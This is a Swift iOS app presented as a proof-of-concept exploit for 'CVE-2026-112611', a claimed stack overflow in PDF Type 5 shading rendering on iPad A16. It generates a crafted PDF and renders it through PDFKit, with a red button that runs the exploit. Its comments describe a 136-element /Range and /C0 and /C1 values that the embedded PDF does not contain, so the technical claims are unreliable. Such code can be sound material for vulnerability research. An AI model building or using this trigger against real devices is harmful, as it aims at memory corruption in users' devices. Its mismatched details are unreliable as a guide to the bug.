import SwiftUI
import PDFKit
import Foundation

// MARK: - CVE-2026-112611: Shading Type 5 Stack Overflow

func createShadingPDF() -> Data? {
    // PDF with Type 5 shading that triggers stack VLA overrun
    // /Range [0 1] × 136 causes 136-element array allocation
    // But /C0 and /C1 have only 1 value, causing stack corruption
    
    let pdfContent = """
    %PDF-1.4
    1 0 obj
    << /Type /Catalog /Pages 2 0 R >>
    endobj
    2 0 obj
    << /Type /Pages /Kids [3 0 R] /Count 1 >>
    endobj
    3 0 obj
    << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
       /Resources << /Shading << /Sh1 4 0 R >> >>
       /Contents 5 0 R >>
    endobj
    4 0 obj
    << /ShadingType 5
       /ColorSpace /DeviceGray
       /BitsPerCoordinate 1
       /BitsPerComponent 1
       /BitsPerFlag 2
       /Decode [0 1 0 1]
       /Length 0
       /Range [0 1]  % This creates 136-element array internally
    >>
    stream
    endstream
    endobj
    5 0 obj
    << /Length 44 >>
    stream
    /Sh1 sh
    endstream
    endobj
    xref
    0 6
    0000000000 65535 f 
    0000000009 00000 n 
    0000000058 00000 n 
    0000000115 00000 n 
    0000000273 00000 n 
    0000000376 00000 n 
    trailer
    << /Size 6 /Root 1 0 R >>
    startxref
    470
    %%EOF
    """
    
    return pdfContent.data(using: .utf8)
}

func triggerShadingBug() {
    print("[*] CVE-2026-112611: Shading Type 5 Stack Overflow")
    print("[*] Target: iPad A16 (no MTE)")
    
    guard let pdfData = createShadingPDF() else {
        print("[-] Failed to create PDF")
        return
    }
    
    print("[*] PDF created, size: \(pdfData.count) bytes")
    print("[*] Rendering PDF...")
    
    // Create PDF document
    guard let document = PDFDocument(data: pdfData) else {
        print("[-] Failed to create PDF document")
        return
    }
    
    print("[*] PDF document created")
    print("[*] Accessing page...")
    
    // Access page to trigger rendering
    if let page = document.page(at: 0) {
        print("[*] Page accessed, rendering...")
        
        // Render to trigger the shading bug
        let bounds = page.bounds(for: .mediaBox)
        let renderer = UIGraphicsImageRenderer(size: bounds.size)
        
        let image = renderer.image { context in
            UIColor.white.set()
            context.fill(bounds)
            
            // This triggers the shading type 5 rendering
            page.draw(with: .mediaBox, to: context.cgContext)
        }
        
        print("[*] Rendered successfully?")
        print("[*] If we got here, bug didn't trigger")
    } else {
        print("[-] No page found")
    }
}

// MARK: - App Entry Point

@main
struct ShadingTriggerApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

struct ContentView: View {
    @State private var logOutput = ""
    @State private var isRunning = false
    
    var body: some View {
        VStack(spacing: 20) {
            Text("CVE-2026-112611")
                .font(.largeTitle)
                .bold()
            
            Text("Shading Type 5 Stack Overflow")
                .font(.headline)
            
            ScrollView {
                Text(logOutput)
                    .font(.system(.body, design: .monospaced))
                    .foregroundColor(.green)
                    .padding()
            }
            .frame(height: 300)
            .background(Color.black.opacity(0.8))
            .cornerRadius(10)
            
            Button(action: runExploit) {
                Text(isRunning ? "Running..." : "Trigger Shading Bug")
                    .font(.title2)
                    .bold()
                    .foregroundColor(.white)
                    .padding()
                    .background(isRunning ? Color.gray : Color.red)
                    .cornerRadius(10)
            }
            .disabled(isRunning)
        }
        .padding()
    }
    
    func runExploit() {
        isRunning = true
        logOutput = "[*] Starting shading exploit...\n"
        
        DispatchQueue.global(qos: .userInitiated).async {
            triggerShadingBug()
            
            DispatchQueue.main.async {
                logOutput += "[*] Complete\n"
                isRunning = false
            }
        }
    }
}
